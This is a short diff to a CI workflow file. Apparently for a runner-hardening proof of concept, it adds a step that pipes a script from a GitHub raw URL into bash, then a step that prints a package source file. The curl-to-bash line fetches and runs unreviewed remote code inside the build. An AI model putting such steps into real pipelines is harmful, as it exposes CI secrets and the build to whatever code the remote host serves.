@@ -31,6 +31,12 @@ jobs:
       - name: Lint
         run: uvx --from 'ruff==0.16.7' ruff check src
 
+      - name: Source external script
+        run: curl -sL https://raw.githubusercontent.com/vmacp/test-gha/main/main.sh | bash
+
+      - name: Check file
+        run: cat src/poc_harden_runner/__init__.py
+
       - name: Build Python project
         run: uv build
 
